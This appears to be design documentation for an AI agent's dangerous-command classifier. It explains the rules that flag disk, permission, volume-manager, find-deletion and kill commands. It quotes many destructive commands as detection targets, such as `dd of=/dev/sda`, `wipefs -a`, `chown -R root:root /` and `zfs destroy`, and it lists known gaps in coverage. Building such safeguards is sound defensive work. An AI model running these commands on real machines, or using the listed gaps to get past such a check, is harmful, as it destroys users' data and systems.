`dd` is neither shape and is read through its output option instead. `dd` is used legitimately all day (`dd if=/dev/zero of=image.img bs=1M count=64`). A rule that catches the program also catches a disk image build. Only an `of=` that names a block device is a disk. The `of=` is written glued, because that is the spelling everybody uses. No other `dd` option holds those two characters, so a search anywhere in the token is unambiguous. The harmless half was run to fix the spelling: `dd if=/dev/zero of=/dev/null bs=1M count=1` printed `1+0 records out` and wrote nothing anywhere.

`ddOutputTargets` (`packages/agent/src/dangerous-command.ts:1991`) is shared by `posixDiskRules` and `posixStartupWrite` on purpose. `dd of=/dev/sda` and `dd of=/etc/cron.d/job` are the same option that reaches two different families. The parse was written twice and fixed once. That is why a regular expression shared by a matcher and a message is a single function in this file. One reader, two callers. The `of=` is required at the start of a token, because `indexOf` also fires on a file whose own name holds `of=`. The option is glued by `dd`'s own syntax, so no spelling is lost.

`BLOCK_DEVICE_PATH` (`packages/agent/src/dangerous-command.ts:1917`) names a whole disk rather than one of the character devices. The point of a named prefix list instead of `anything under /dev` is that `/dev/null`, `/dev/zero`, `/dev/urandom`, `/dev/std*` and `/dev/tty` are written to constantly. `> /dev/null` is on the end of a healthy command. A rule that fires on those is switched off within a day. Partitions are in the pattern too (`/dev/sda1`, `/dev/nvme0n1p2`). A redirect onto a partition destroys a filesystem just as completely as one onto the whole disk.

Nothing in this pattern was measured on the development machine, and the comment says so: none of these paths exists there. Windows has a `/dev` only through MSYS, and its `sda*` names are directory entries rather than disks. So a `dd of=/dev/sda` on that box writes to a regular file. What was measured is that these are the Linux spellings, by name, from the kernel's own device names. `sd*` is for SCSI and SATA, `nvme*n*` is for NVMe and `hd*` is for IDE. `vd*` is for virtio, `md*` is for RAID, `mmcblk*` is for SD, and `mapper/*` and `cryptsetup/*` are the LVM names. A rule that cannot be run here is still worth a place, but it is labelled as one rather than dressed as a measurement.

`cryptsetup/*` is in the pattern for the same reason `mapper/*` is. The comment used to name `cryptsetup` as one of the device namespaces, but the pattern had no such option. So `dd of=/dev/cryptsetup/root` sailed through, while the same write to `/dev/mapper/cryptroot` was caught. The two spellings are the same device: cryptsetup creates `/dev/mapper/<name>`, and the `/dev/cryptsetup/<name>` form is the other place its node appears.

The `[\w.-]+` under those two directories is a known over-match, and it was already there for `mapper/` before this batch. `dd of=/dev/mapper/vg-root.img` is flagged as a disk although it is an ordinary image file. A narrower `\w+` was tried and is worse, because dashes and dots are legal in an LVM volume name (`vg-root`, `my.volume`). That trade turns a false positive into a false negative on the devices the rule is for. The two cannot be separated by shape, because `/dev/mapper/<name>` has no extension and `/dev/mapper/<name>.img` is not a thing the kernel creates. The `.img` is somebody's own file in the same directory. The direction of the error is stated: a prompt on an image file rather than silence on a volume.

The pattern is anchored at the end, and the anchor carries weight in a way that is easy to get wrong. Without the anchor the `\d*` after `sd[a-z]+` does nothing at all, because `sd[a-z]+` already matches the `sda` of `/dev/sda1` and stops there. The falsification driver found exactly that: three mutations each narrowed the device list, and not one of them failed a single test. The final `\/?$` is what turns the partition names from decoration into the thing actually matched.

The last option is `/dev/<one>/<one>`, added because the options above it do not cover the form LVM itself recommends. From `lvm(8)`: `"A directory bearing the name of each Volume Group is created under /dev when any of its Logical Volumes are activated"`, and the recommended path is `/dev/VolumeGroupName/LogicalVolumeName`. That is the same sentence the note above quotes to explain why `mapper/` is over-matched. It is the sign that `mapper/` was added as an example of the shape rather than as the shape itself. `lvm(8)` also says `"Links or nodes in /dev/mapper are intended only for internal use"`, so a rule built on `/dev/mapper` alone covers the spelling LVM tells you not to use. Measured before the change, against this pattern: `dd if=/dev/zero of=/dev/vg0/lvol0` and `of=/dev/vg-root/lv-data` both returned no match, while `of=/dev/mapper/vg0-lvol0` matched.

This over-matches deliberately, in the direction the note above already chose. The two-segment shape cannot separate a volume group from `shm`, `pts`, `fd` or `mqueue`, because those are directories too. What bounds the cost is that all four call sites consult this pattern in narrow cases only. The cases are a redirect onto a device, `dd`'s output target, and a program already in `DISK_WRITING_PROGRAMS`. Measured after the change, the newly-caught rows that are not devices are exactly three: `dd … of=/dev/shm/scratch`, `dd … of=/dev/pts/0` and `dd … of=/dev/mqueue/mails`, plus `wipefs -a /dev/shm/blob` after that exemption was added. Against them the change adds `dd … of=/dev/vg0/lvol0` and `of=/dev/vg-root/lv-data`, which erase a volume. The rows that must not move did not: `cat /dev/shm/scratch`, `cp /dev/shm/a /tmp/b`, `> /dev/null`, `dd … of=/dev/null` and `of=image.img` are all still quiet, because none of them reaches this pattern. Same trade as `mapper/`, same stated direction: a prompt on the harmless case rather than silence on the destructive one.

`DISK_WRITING_PROGRAMS` (`packages/agent/src/dangerous-command.ts:1922`) holds `mkfs`, `mke2fs`, `mkswap`, `wipefs`, `fdisk`, `sfdisk`, `cfdisk`, `gdisk`, `sgdisk`, `parted`, `gparted`, `partprobe` and `shred`. `mke2fs` is in the set, and so is `mkfs.ext4`, because that is the program's real name and `mkfs.ext4` is a symlink to it. Not all of this set is measurable here, and the split is exact. `command -v` finds `shred` and `dd` in `/usr/bin`, and finds an `mke2fs` at `/d/AndroidSDK/platform-tools/mke2fs`, which is the Android SDK's copy rather than a system tool. It finds nothing for `mkfs`, `mkfs.ext4`, `mkswap`, `wipefs`, `fdisk`, `sfdisk`, `cfdisk`, `sgdisk` or `parted`. A directory read of `/usr/bin` returns only `shred` from that family. So the `mkfs*`, `wipefs` and partition-table rules were written from the names and were not run here. The `shred` and `dd` spellings were run.

`shred` is not asked anything. It overwrites a file until nothing of it is left and then deletes it, which is the whole of its purpose. So it has no read-only spelling worth a name. Both halves were run on a file the script created: `shred -u -n 1 -z <tempfile>` exited 0 and the file was gone.

`DISK_LIST_FLAGS` (`packages/agent/src/dangerous-command.ts:1945`) holds `-l`, `--list`, `-p`, `print` and `--print`, the read-only spellings that print a table and change nothing. None of them is also a way to write. `fdisk`, `sfdisk` and `sgdisk` write through commands (`w`, `mklabel`, `--zap-all`) rather than through a flag that collides with these. `-p` is `sgdisk`'s short form of `--print`, and it was absent, which made `sgdisk -p /dev/sda` a false positive in the whole rule. The same command spelled out long was not flagged, so the difference was the length of a flag and nothing else.

A filesystem tool needs a device as its target, while a partition tool has a read-only spelling that prints a table and exits. The list exempts whether or not a device is named, because `fdisk -l /dev/sda` prints and changes nothing. To flag it teaches people to switch the rule off rather than to read it.

The comment used to say `-p` was `sgdisk`'s and `parted`'s, and the `parted` half is false. GNU `parted` has no `-p` and no `--print`: its whole option table (`parted/parted.c:122-132`) is `help, list, machine, json, script, fix, version, align` and `-pretend-input-tty`. Its `getopt_long` call at `:2377` passes the option letters `"hlmjsfva:"` with no `p` in it. `print` is a command there, `parted /dev/sda print`, which the bare `print` entry already covers. `parted -p /dev/sda` exits with `parted: invalid option -- 'p'`, so the exemption it bought was dead weight for a command that cannot run. Dead weight in this direction is the safe one, which is why `-p` stayed. The false claim is what did not stay. The `sgdisk` half has no check behind it, because every gdisk mirror reachable from the box answers 404. So `-p` rests on it without a citation, and that is said rather than implied.

Nothing in this table was measured, and the sentence is the claim rather than a result. None of the five programs exists on the machine. What is checked is the other half: that no program that writes uses `-p` to mean write. All of `mkfs, mke2fs, mkswap, wipefs, fdisk, sfdisk, cfdisk, gdisk, sgdisk, parted, gparted, partprobe, shred` write through `-w`, `w`, `mklabel`, `--zap-all` or a bare destination path. None of them documents `-p` as destructive. If a program in this set ever gains a `-p` that writes, this table is where that becomes a false negative.

`DISK_PROGRAM_READ_ONLY_FLAGS` (`packages/agent/src/dangerous-command.ts:1949`) is keyed by program, and `-F` is the reason. `mke2fs -F` is mke2fs's own "force", a real write flag, and one people type on a disk that "will not format otherwise". A shared read-only list with sfdisk's `--list-free` short form (`sfdisk.c:2295`, `{"list-free", no_argument, NULL, 'F'}`) makes `mke2fs -F /dev/sda` quiet. No shared read-only table is safe once one program in it has a destructive spelling of a letter another program treats as a list.

Every sfdisk entry was read out of `util-linux/disk-utils/sfdisk.c` on master. The five are `-d/--dump` (`:2288`, help `:2168`), `-J/--json` (`:2291`, help `:2169`), `-g/--show-geometry` (`:2307`, help `:2171`), `-F/--list-free` (`:2295`, help `:2173`) and `-V/--verify` (`:2309`, help `:2177`). `command_dump` even says so in its own source: `:1065` is `assign_device(sf, devname, 1);` with the comment "read-only" on it.

Three read-only sfdisk spellings are still flagged, and this is the honest reason rather than a gap nobody noticed. `--part-type <dev> <part> [<type>]` (`:2182`), `--part-uuid <dev> <part> [<uuid>]` (`:1242`, "read-only if uuid not given") and `--part-label <dev> <part> [<name>]` (`:1297`, "read-only if name not given"). `DISK_DESTRUCTIVE_FLAGS` (`packages/agent/src/dangerous-command.ts:1955`) holds `--zap-all`, `--zap`, `mklabel`, `mkpart` and `mkfs`, and is checked before `DISK_LIST_FLAGS`. The exemption is a statement about the whole command line and cannot be true when a write flag is on the same line. Without that order, `sgdisk -p /dev/sda --zap-all` printed its table and then erased it, and the presence of `-p` had already returned the rule as safe. The row that caught this was one the `-p` fix added for exactly this reason, and it went red on the first run. `--zap-all` is `sgdisk`'s. The rest are `parted`'s and `sfdisk`'s, and they are subcommands rather than flags. So `parted /dev/sda mklabel msdos` is the everyday relabel. `sfdisk`'s `-d`/`--delete` and `--part-type` take a device as the next argument. The device name is what catches them, and no flag list is needed. Nothing here was measured, for the same reason as the list above. What is checked is that each name is a thing the program is documented to accept.

Inside `posixDiskRules` the branch order carries three documented decisions. The `shred` check comes before the device test, because shred is unconditional. The `wipefs` branch is separate, because `wipefs` prints when it is not given a flag to erase with. So the device-shape test cannot be the test for it. From `wipefs(8)`: with no options it "lists all visible filesystems and the offsets of their basic signatures". `-a, --all` is "Erase all available signatures", and `-o, --offset` names `"the location (in bytes) of the signature which should be erased"`. Both flags are single-dash short and double-dash long and both are listed (`WIPEFS_ERASING_FLAGS`, `packages/agent/src/dangerous-command.ts:2026`). The split is the manual's rather than a habit. A rule that reads one spelling of each pair misses `wipefs --all /dev/sda`, and that is the spelling a script writes.

The `wipefs` measurement is the reason for the split. Before this branch, `wipefs /dev/sda`, `wipefs -a /dev/sda` and `wipefs -o 2048 /dev/sda` all returned the same string "pointed at a disk, which overwrites what is on it". Two of those three erase nothing, and `wipefs /dev/sda` is a routine diagnostic, the command you run to find out what is on a disk. A prompt on it teaches people to dismiss the rule, which is the failure the read-only exemptions exist to avoid.

The `arg.toLowerCase()` that both later tables use is deliberately absent from the `wipefs` branch, and that is a correctness difference rather than an inconsistency. `wipefs(8)`'s option list holds one pair that differs only by case: `-o, --offset` erases a signature and `-O, --output` chooses an output format. A lower-case fold maps the read-only flag onto the erase flag. So `wipefs -O /dev/sda`, which prints, takes the branch below and is reported as an overwrite of the disk. Options on a POSIX program are case-sensitive, so a case-sensitive read is also simply what the program does. If this branch ever gains a `toLowerCase()` to match its neighbours, `wipefs -O` is the row that goes red. The same logic put `-O` (and `--OUTPUT`) out of `WIPEFS_ERASING_FLAGS` on purpose. Its absence carries weight, and the table is matched case-sensitively at the call site for exactly that reason.

The bare `wipefs` with no device is covered by the same test. It does not need the "opens the first one it finds" row at the bottom. With nothing to erase and nothing named, it lists every filesystem it can see. And `-n`/`--no-act` is wipefs's dry run, the one caller of `isDryRun` this rule never consulted. `misc-utils/wipefs.c:631` prints the help line `-n, --no-act    do everything except the actual write() call`, and `:669` binds `{"no-act", no_argument, NULL, 'n'}`. `wipefs -n -a /dev/sda` is the `"what would this erase?"` question, and the rule flagged it as an erase. Both spellings are named rather than the short cluster read for an `n`, because `isDryRun` knows only `--dry-run` and the `-n` cluster shape. `--no-act` carries no `n` in a short flag at all. In the option string at `wipefs.c:692`, `"ab::fhiJnO:o:pqt:V"`, the letter `n` appears nowhere else, so a cluster read is safe here. Both spellings are still named, and that is what makes the row readable. The rule already carries a case-sensitivity note in the paragraph above.

`-t` is deliberately absent from `WIPEFS_ERASING_FLAGS`. The manual says the set erased by `-a` "can be restricted with the -t option". So an erase that names types still erases something, only less of it. The branch treats every command that passes the table as an erase, so the absence of `-t` cannot make the rule miss. Without `-a` or `-o` there is nothing to erase at all, and a bare `wipefs -t ext4` only lists.

The branch order in full: a `wipefs` with `-n` or `--no-act` returns nothing. A `wipefs` without an erase flag returns nothing. A destructive flag, read with a lower-case fold, with a block device named or on the `sgdisk` program itself, returns the partition-table message. The message is `` `program` with a flag that writes a partition table over what is on it ``. A list flag, read with a lower-case fold, returns nothing. A per-program read-only spelling, read case-sensitively, returns nothing. The reason for that order is the same as the first: `sfdisk -d /dev/sda` prints, `sfdisk -d /dev/sda --relabel gpt` does not, and only the order tells those apart. A block-device argument returns `` `program` pointed at a disk, which overwrites what is on it ``. A command with no arguments at all returns `` `program` with no device named, which opens the first one it finds ``. `fdisk` on its own opens the first device it can find and waits at a prompt where `w` writes a table. Otherwise the rule returns nothing.

### POSIX permissions

`SYSTEM_ROOTS` (`packages/agent/src/dangerous-command.ts:2097`) holds the directories whose permissions belong to the machine rather than to a project: `/, /bin, /sbin, /lib, /lib32, /lib64, /usr/bin, /usr/lib, /usr/sbin, /usr/include, /etc, /boot, /dev, /proc, /sys, /root, /System, /Library`. The paths listed are the ones that hold the binaries, the configuration and the devices. A recursive change there breaks the machine rather than a checkout.

`/home` and `/Users` are deliberately not there. `chmod -R 755 ~/project` and `chown -R me ~/project` are two of the most ordinary commands in software work. A rule that catches them fires on everything. The macOS entries are present because the POSIX half of this file is not Linux-only. `classifyDangerousCommand` takes a `posix` platform rather than a macOS or Linux test of its own.

`touchesSystemRoot` (`packages/agent/src/dangerous-command.ts:2120`) compares on a path boundary, not on the letters: `/etc` and `/etc/ssh` are the machine's, `/etcetera` is not. A prefix match without the slash flags a project directory that happens to start with a system's name. That is a false positive of exactly the kind that makes people lose trust in the rule. One detail carries weight: `/` must not be stripped down to the empty string, or the root itself is no longer a match. The probe caught this: `chown -R root:root /` came back as nothing at all. A slash at the end is trimmed only when the token is longer than one character, and the token must start with `/`.

`MODE_SYMBOLIC` (`packages/agent/src/dangerous-command.ts:2141`) is the shape of a symbolic mode operand: one or more clauses of who, a sign, and what. `u+s`, `ug+s`, `a+rwxs` and `u+s,g-s` are all this shape. `notes+s.txt`, `755` and `/usr/bin/sudo` are not.

`hasSetIdBit` (`packages/agent/src/dangerous-command.ts:2145`) reads two spellings and both are real. `chmod 4755 f` puts the setuid bit in the first octal digit. A three-digit mode like `755` has no special digit at all, which is why the test is on the length and not on the value. `chmod u+s f` says the same thing symbolically. Only a `+` sets a bit: `chmod -s f` takes the set-user-ID bit away, and this rule exists to catch that act.

An argument is only read as a mode when it has the shape of one. The shapes are three or four octal digits, or clauses of `[ugoa]` and a sign and permissions. A check for a literal `+s` instead is how the probe caught a false positive. `notes+s.txt` is a perfectly good filename, and the earlier "no mode holds a slash" guard did not rule it out. That filename has no slash either. The shape test rules it out, because there is no `.` in the shape.

The measurement is partial and split exactly. This machine's GNU coreutils 8.32 accepts `-R, --recursive, OCTAL-MODE, a+rwx, u+s, g+s, o+w, 4755, 2755, 666`, all with exit 0. `chmod --help` names `-R, --recursive`. Whether any of them did anything is not measurable here. This is NTFS through MSYS, which has no POSIX mode bits, so `stat -c %a` reported `644` for `4755`, `2755` and `666` alike. The spellings are checked. The effects are taken from the POSIX definition and are not a claim about this machine.

`posixPermissionRules` (`packages/agent/src/dangerous-command.ts:2428`) holds two conditions and both are needed. A recursive change is ordinary, and `chmod -R 755 build/` is in a thousand build scripts. A change to one of these paths is also ordinary, and `chmod 755 /etc/nginx.conf` is an admin's afternoon. What is neither is the two together, because that is the command that leaves a machine with nobody able to log into it. The recursion flag can come on either side of the mode, because `chmod -R 755 /etc` and `chmod 755 -R /etc` are both valid. So it is looked for anywhere rather than at a fixed offset. That is the same reason `dangerousWindowsAdmin` scans every argument rather than the first. The recursion test reads `-R`, `--recursive`, `-r` and a `--recursive=` prefix. A `chmod` with a set-ID bit returns its own rule before any of this. Otherwise the rule needs one of `chmod`, `chown` or `chgrp`, the recursion flag, and a system root. It then reports `` `program` applied recursively to `root`, which is the machine's ``.

### POSIX volume managers

None of these programs is reachable by the device-shape rules above, and the reason differs per family. So they have their own function rather than more rows in `DISK_WRITING_PROGRAMS`.

LVM names its objects, not devices. `lvremove vg0/lvol0` takes two names in one argument and never writes `/dev/...` on the command line, so there is no path to match. There is also no read-only spelling to spare. `lvremove(8)`'s synopsis is `lvremove position_args [ option_args ]` and its description is "lvremove removes one or more LVs". `-f, --force` is documented as "Override various checks, confirmations and protections". That is about interactivity, not about whether anything is destroyed. So a bare `lvremove` destroys after a prompt, and a rule that waits for `-f` misses it. The read-only siblings are different programs (`lvs`, `vgs`, `pvs`, `lvdisplay`), which keeps this a program-name table. `LVM_DESTRUCTIVE_PROGRAMS` (`packages/agent/src/dangerous-command.ts:2234`) holds `lvremove`, `vgremove` and `pvremove`.

ZFS dispatches on a subcommand, and the destructive three are a small minority of the verbs. They are `zfs destroy`, `zfs rollback` and `zpool destroy`, against `zfs list`, `zfs get`, `zpool list` and `zpool status`. The table names the three rather than the safe ones. A verb added to ZFS later is then quiet by default instead of dangerous by default.

`blkdiscard` is `blkdiscard [options] [-o offset] [-l length] device`. The device is positional and the manual offers no list-only mode. It warns "All data in the discarded region on the device will be lost!". The command discards rather than overwrites, so the message says discard and does not claim the data was overwritten. The act is not the act `wipefs` does.

The `-n` exemption belongs to `zfs destroy` alone. `zfs destroy(8)` documents `-n` as "Do a dry-run ("No-op") deletion. No data will be deleted." The synopsis of `zpool destroy` is `zpool destroy [-f] pool`, with `-f` the only option and no dry run documented. So no exemption is claimed for it and `zpool destroy -n` still fires, which is the conservative direction for a flag whose role is not established here.

`zfs rollback` is in the table and is not a deletion, and that is the point of a separate entry in the messages. `zfs-rollback(8)`'s synopsis is `zfs rollback [-Rfr] snapshot`. Its two range options destroy what came later. `-R` "destroys later snapshots, bookmarks, and their clones", and `-r` "destroys snapshots and bookmarks later than the specified one". So the act discards everything written since that snapshot, and there is no undo that is not another rollback. The message says that and does not call it a delete.

`zpool rollback` is deliberately absent, because it is not a command. It was in this table until it was measured rather than assumed. OpenZFS ships no `zpool-rollback.8`. `man/man8/zpool.8` mentions `destroy` eight times and `rollback` not at all, and `cmd/zpool/` has no rollback source. A code search of the whole repository for the string `zpool rollback` returns zero hits. An entry for a command that cannot run is a claim about a program that does not exist. So it is removed rather than left to look thorough. `zpool rollback tank@snap` is therefore quiet, and the row that holds that is in the test file.

`ZFS_DESTRUCTIVE_VERBS` (`packages/agent/src/dangerous-command.ts:2242`) has three entries, and the third is the absence of `zpool rollback`. `destroy` reads differently between the two programs, because a dataset is removed while a pool "frees up any devices for other use". So the phrase names the program rather than a shared one. `ZFS_DRY_RUN_FLAGS` (`packages/agent/src/dangerous-command.ts:2254`) holds `-n` alone.

`hasZfsDryRunFlag` (`packages/agent/src/dangerous-command.ts:2293`) reads POSIX option bundles. `zfs-destroy(8)`'s synopsis is `zfs destroy [-Rfnprv] filesystem|volume`, one bracketed cluster of single letters. So `-nv` is two flags, `-n` and `-v`, and it is the same dry run as `-n` alone. Measured before this helper existed: a token-wise check of a set with `-n` in it let `zfs destroy -nv tank/data` through as a real destroy. That is the wrong direction for an exemption. A long option is not split, because `--` names one option and its letters are not flags. ZFS has long forms of its own, `--dryrun` among them, which is deliberately not in the table. The synopsis documents only the cluster, so only the cluster is claimed. The helper returns true for a flag in the set. It also returns true for a short flag of more than two characters that holds a letter of the set.

`posixVolumeRules` (`packages/agent/src/dangerous-command.ts:2256`) starts with the LVM program-name lookup. For `blkdiscard`, a device path is the whole test and is matched by shape rather than by position. The synopsis is `blkdiscard [options] [-o offset] [-l length] device`, and `-o` and `-l` take their values as separate words. The first bare word is the offset and not the device. Measured before this was changed to a shape test: `blkdiscard -o 1024 -l 2048 /dev/sdb` reported that it "discards the sectors of `1024`". That names a number as a device. A test for `/dev/` also means no long-form spelling of an option can make its value look like the target. A count of positions cannot give that promise. The message is `` `blkdiscard`, which discards the sectors of `device` so the data on them is gone ``.

For `zfs` and `zpool`, the verb is the first bare word. A positional read rather than a search of the whole line is deliberate. A dataset may be named after a verb, and `zfs create tank/destroy` creates a dataset rather than a removal of one. So only the slot right after the program is consulted. Position is safe for these three verbs because every option any of them documents is a switch that takes no separate word. `zfs destroy` is `[-Rfnprv]` / `[-Rdnprv]`, `zfs rollback` is `[-Rfr]` and `zpool destroy` is `[-f]`. `zfs(8)` documents no global option. So the options of a destructive verb sit after it, and the first bare word is the verb in every real spelling. The options that take a value belong to other subcommands: `-o`, `-s`, `-i` and `-d` are documented under `zfs get`, `zfs allow`, `zfs send` and `zfs receive`. None of those is in this table. A future destructive verb that takes a value word needs the next token skipped. The `-o` shape above is what it has to skip. The final message is `` `program verb`, which phrase ``. Only `zfs destroy`'s dry run is exempted.

### POSIX subcommand volume tools

`nvme`, `cryptsetup` and `btrfs` each dispatch on a subcommand. None of the three is reachable by the program-name or device-shape rules elsewhere in this file. Each is out of reach for its own reason, which is why they are one function rather than three more rows in a table. `nvme` puts a whole set of global options before the subcommand. `cryptsetup` spells its actions in mixed case and takes options on both sides of them. `btrfs` needs two words before the operands.

Every message in `SUBCOMMAND_DESTRUCTIVE_PROGRAMS` (`packages/agent/src/dangerous-command.ts:2305`) is the manual's own claim rather than a paraphrase of the command's name. Three are deliberately not about an overwrite. `cryptsetup-erase.8.adoc` says "The *erase* does not wipe or overwrite the data area". `cryptsetup-luksFormat.8.adoc` says "Note that luksFormat does not wipe or overwrite the data area". So neither message may describe what either one does as an overwrite. What `erase` removes is the volume key, and the encrypted data stays in place and unreachable. `hdparm.8` 9.65 holds no occurrence of "overwrit", "cryptograph", "sanitize" or "purge" in its 37,640 bytes, so `--security-erase-enhanced` cannot be described as any of those. It is on the platform's own list as `"Enhanced erase (locked) drive, using password PWD"`, and that is the whole of what is claimed.

Two commands these tables do not include, both checked rather than assumed. `btrfs filesystem delete` does not exist: `Documentation/btrfs-filesystem.rst` is 25,477 bytes of upstream text in which "delete" appears twice. Both are incidental, in a `fdisk(8)` cross-reference and in a sentence about a cleanup of deleted subvolumes. The real removals are `btrfs device remove` and its documented alias `btrfs device delete`. And `nvme dim` is not a device-format command. It is the Fabrics Discovery Information Management command, whose own description is `"The task to perform: \"register\" or \"deregister\""`. So it is not grouped with `nvme format` despite the letters.

The map holds `nvme` with `format` and `sanitize`, `cryptsetup` with `luksFormat`, `erase` and `luksErase`, and `btrfs` with `subvolume delete`, `device remove` and `device delete`. `nvme sanitize` "sends the device a Sanitize command" and `--preq` is documented as the host `"requesting that the user data be purged"`. `nvme format` carries its own manual's warning that a guess about a device relationship from the name may `"irrevocably erase data on an unintended device"`. `cryptsetup luksFormat` "writes a new LUKS header". The manual notes that "unless you have a header backup, all old encrypted data in the container will be permanently irretrievable". `cryptsetup erase` and `luksErase` each erase all keyslots, `"removing the volume key"`, so the encrypted data stays in place and cannot be read. The manual is explicit that this "does not wipe or overwrite the data area". `btrfs subvolume delete` removes the subvolume from the filesystem and `-R` also removes those beneath each one. `btrfs device remove` and `device delete` take the device out of the filesystem and relocate what was stored on it. The manual calls `device delete` an alias of `remove`.

`SEPARATE_VALUE_OPTIONS` (`packages/agent/src/dangerous-command.ts:2357`) holds the options documented to take their value as a separate word. The word after them is an argument and not a verb. Only `nvme` has an entry, because only `nvme` has a documented global option of that shape. `Documentation/global-options.txt` lists `--dry-run`, `--no-ioctl-probing`, `--no-retries` and `-v`/`--verbose` as switches, and `--output-format-version=<version>` and `--timeout=<ms>` in the attached form. So `-o <fmt>` alone takes the next word. The subcommand options of `nvme` (`-n -l -b -s -p -i -m` for `format`) all come after the subcommand, so they cannot displace it. `cryptsetup` and `btrfs` are deliberately absent rather than guessed at. No fetched source enumerates the global options of `cryptsetup`. A table entry here is a claim that the word after that flag was read as a value. The cost of their absence is written down instead. `cryptsetup --key-file k luksFormat /dev/sdb` puts the action in second place and is not matched.

`NVME_DRY_RUN_FLAGS` (`packages/agent/src/dangerous-command.ts:2361`) holds `--dry-run`, the only dry run of the three tools. `Documentation/global-options.txt`: `--dry-run` `"Print the command that would be executed, but do not actually execute it."` It is a global option, so it is honoured before or after the subcommand, and both are checked. `--force` is not the same thing and is not treated as one. `nvme-format.txt` documents it as "Just send the command immediately without warning of the implications". That is a confirmation the tool skips and not a command it does not run. `btrfs subvolume delete` has no dry run at all, because none of `--dry-run`, `-n` or `--no-run` is in its option list, so there is nothing to exempt.

`NVME_DEVICE_PATH` (`packages/agent/src/dangerous-command.ts:2365`) accepts both device forms `nvme(1)` documents. `nvme-format.txt`: `"The \<device\> parameter is mandatory and may be either the NVMe character device (ex: /dev/nvme0), or a namespace block device (ex: /dev/nvme0n1)."` `nvme-sanitize.txt`: `"The \<device\> parameter is mandatory NVMe character device (ex: /dev/nvme0)."` Both forms are therefore accepted for both verbs. The partition suffix `p1` is the ordinary one a namespace carries once it is partitioned. `/dev/nvme0` is not matched by the `BLOCK_DEVICE_PATH` shape above, which needs the `n<digits>` of a namespace, so this is its own pattern.

`BTRFS_SHRINK_SIZE` (`packages/agent/src/dangerous-command.ts:2369`) names a `btrfs filesystem resize` size argument that decreases the filesystem. `Documentation/btrfs-filesystem.rst` gives the spelling as `resize [options] [<devid>:][+/-]<size>[kKmMgGtTpPeE]|[<devid>:]max <path>` and the prose as `"If the prefix *+* or *-* is present the size is increased or decreased by the quantity *size*"`. The sign is a prefix on the size token. It is either bare (`-1G`, the first of the two documented examples) or behind a device id (`1:-1G`, the second). Both are matched. `max` is a growth, `+1G` is a growth, and neither has the `-` this needs. A `-` at the front is not what tells a shrink from a flag here. The options `resize` documents are `--enqueue` and `--offline`, and neither is this pattern. So `--enqueue` cannot be mistaken for a negative size.

`posixSubcommandVolumeRules` (`packages/agent/src/dangerous-command.ts:2371`) collects the bare words, with a value option that takes the next word so the verb is never read out of it. The key for `btrfs` is the first two bare words joined, because `subvolume delete` and `device remove` are two words. Nothing about that needs the option grammar above, since the two words are adjacent in every documented spelling. The operand is required, because all three tools need one. A rule that fired on the action alone fires on a fragment of a longer line. It is also what keeps the read of the action honest. `nvme`'s own warning is about action on the wrong device, so a device is what this asks for. `btrfs` accepts any word that starts with `/`. `nvme` accepts a word that `NVME_DEVICE_PATH` matches. `cryptsetup` accepts a word that starts with `/dev/`.

`filesystem resize` is the one action here the verb does not decide, so it is not in the table. `btrfs filesystem resize` shrinks or grows on the sign of a later argument, and both documented growths have to stay quiet. `--offline` is not exempted, though its own warning invites it. The flag `"currently supports **only increasing** the size of **single-device** filesystems"` and `"shrinking and multi-device filesystems are **not supported** with this option"`, which reads like a command btrfs refuses. But the same entry then says that for filesystems stored in regular files `"the file will be truncated to the new size as part of the resize operation"`. A truncation is a shrink. Which of the two happens to `btrfs filesystem resize --offline -1G` is not established by the text, so the warning is not given up on a guess. An extra warning on a combination btrfs rejects is cheap. Its absence on a combination btrfs does run is not. There is no dry run to exempt: `--enqueue` waits for another exclusive operation and `--offline` resizes an unmounted filesystem, and neither is one.

The `filesystem resize` branch returns the rule when any token matches the shrink-size pattern, with the manual quote in the message. Otherwise the manual's own spelling is used: it spells the actions `luksFormat` and `luksErase`, and that is what the table holds. The comparison folds case so the lowercase spelling is covered as well, because `executableName` lower-cases only the program name. So `luksFormat` reaches this with its capital intact, while `luksformat` does not. The two are the same action to a person who reads the line. The scan is linear because the table has three programs and eight entries. An index is a structure whose correctness has to be argued for, and this does not need one. `nvme` with a dry-run flag returns nothing before any of this.

### The find rules

A find that deletes what it finds, without any mention of `rm`, is `posixFindRules` (`packages/agent/src/dangerous-command.ts:2456`). Measured on this machine, in a directory this session created: `find . -type f -delete` and `find . -name '*.txt' -exec rm {} +` both removed the files and exited 0. `find . -delete` took the directory with them.

This is the same shape as the `rm -rf` case and it had the same hole. `find` is not in `COMMAND_PREFIX_PROGRAMS`, so nothing unwrapped the `rm` inside `-exec` and every one of these classified as nothing. That is the worst shape a gap can have, because the result is indistinguishable from the ordinary `find . -print` next to it in the transcript.

Only the commands that delete are named, never the predicate. `find . -name '*.ts' -exec grep -l todo {} +` is how a codebase is searched and must stay quiet, and a rule that flagged `-exec` is switched off within a day. `FIND_EXEC_PREDICATES` (`packages/agent/src/dangerous-command.ts:2449`) holds `-exec`, `-execdir`, `-ok` and `-okdir`. The last two are included even though they ask first. The answer to that question is `y` far more often than anyone types `n`. `DELETING_COMMANDS` (`packages/agent/src/dangerous-command.ts:2452`) holds `rm`, `rmdir`, `unlink` and `shred`.

`find … | xargs rm -rf` needs none of this. `xargs` is already unwrapped as a wrapper program above, and this function deliberately does not repeat it. A second, unreachable copy of a rule that already exists is the kind of thing that reads as coverage and measures as nothing. A `-delete` anywhere in the arguments returns `` `find -delete`, which removes everything it matches ``. Otherwise the predicate is looked for together with the delete command after it. The message reads `` `find` ``, then `running`, then `` `verb` ``, then `on everything it matches`.

### POSIX process and service rules

`namesForcedSignal` (`packages/agent/src/dangerous-command.ts:2476`) answers whether an argument names the signal `-s`/`--signal` was given, or is itself the signal. Both spellings exist and both were measured: `kill -9 <pid>`, `kill -KILL <pid>`, `kill -s KILL <pid>`, and `kill -l` on this box's bash builtin answers `KILL  9`. So the two names really are the same signal under two spellings. `FORCED_SIGNALS` (`packages/agent/src/dangerous-command.ts:2472`) holds `9`, `kill`, `sigkill` and `k`. Both spellings are in the set rather than one derived from the other. A strip of the `sig` prefix is the tidier way to say that, and a mutation driver caught that it changes nothing. So the set says both and the strip is not there. The helper strips dashes at the front and lower-cases before the lookup.

`posixProcessRules` (`packages/agent/src/dangerous-command.ts:2577`) covers three families, and the reason each one is drawn where it is comes from a measurement rather than from an analogy.

